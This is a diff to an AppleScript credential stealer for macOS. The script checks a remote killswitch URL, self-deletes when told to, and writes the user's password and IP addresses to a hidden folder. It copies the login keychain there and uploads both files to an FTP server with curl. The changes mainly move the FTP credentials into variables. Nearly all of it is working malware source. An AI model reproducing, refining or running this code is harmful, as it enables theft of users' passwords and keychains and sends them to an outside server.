@@ -1,5 +1,4 @@
 set theuser to do shell script "whoami"
-
 try
 	do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1" -- Check for a killswitch
 	set killswitch to (characters 1 through -1 of result) as text -- Get IP
@@ -11,8 +10,6 @@ try
 		end tell
 		try
 			do shell script "rm -rf ~/public/." & theuser
-		end try
-		try
 			do shell script "rm -rf " & (POSIX path of (path to me))
 		end try
 		return
@@ -56,18 +53,23 @@ try
 		do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
 	end try
 	
+	set myuser to "<Username>"
+	set mypass to "<Password>"
+	set myserv to "<ftp address>"
+	set mypath to "</path/to/folder/>"
+	
 	try
-		tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
+		tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u " & myuser & ":" & mypass & " ftp://" & myserv & mypath & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
 	end try
 	
 	try
 		set china to "~/Library/Keychains/login.keychain"
 		do shell script "cp " & china & " " & ufld
-		do shell script "mv /Users/" & theuser & "/Public/." & theuser & "/login.keychain /Users/" & theuser & "/Public/." & theuser & "/" & theuser & ".keychain" -- Copy keychain to hidden folder
+		do shell script "mv " & ufld & "login.keychain " & ufld & theuser & ".keychain" -- Copy keychain to hidden folder
 	end try
 	
 	try
-		tell application "Finder" to do shell script "curl -T " & ufld & "" & theuser & ".keychain -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".keychain" -- Upload Keychain to FTP server
+		tell application "Finder" to do shell script "curl -T " & ufld & "" & theuser & ".keychain -u " & myuser & ":" & mypass & " ftp://" & myserv & mypath & theuser & "_" & WANIP & "_" & dte & ".keychain" -- Upload Keychain to FTP server
 	end try
 	
 end try
